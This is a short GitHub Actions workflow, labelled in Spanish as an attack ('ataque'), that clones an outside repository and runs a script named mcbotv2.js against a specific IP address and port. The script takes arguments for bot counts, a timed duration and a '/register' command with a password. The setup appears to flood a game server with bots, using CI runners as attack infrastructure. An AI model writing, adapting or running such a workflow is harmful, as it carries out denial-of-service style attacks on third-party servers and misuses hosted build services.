name: Ata1a
on:
  workflow_dispatch:

jobs:
  anak:
    runs-on: ubuntu-latest
    timeout-minutes: 1
    
    steps:
      - name: Clonar repositorio
        run: |
          git clone https://github.com/ricardocraft121-gif/ssh2.git
          
      - name: Entrar y ejecutar ataque
        run: |
          cd ssh2
          timeout 25 node mcbotv2.js 93.177.64.145 5789 44444 20 "/register hawaiana|Hoaolsozozososkksksksk" 5
          
      - name: Limpiar
        if: always()
        run: |
          echo "✅ Ataque completado después de 20 segundos"
          sleep 2
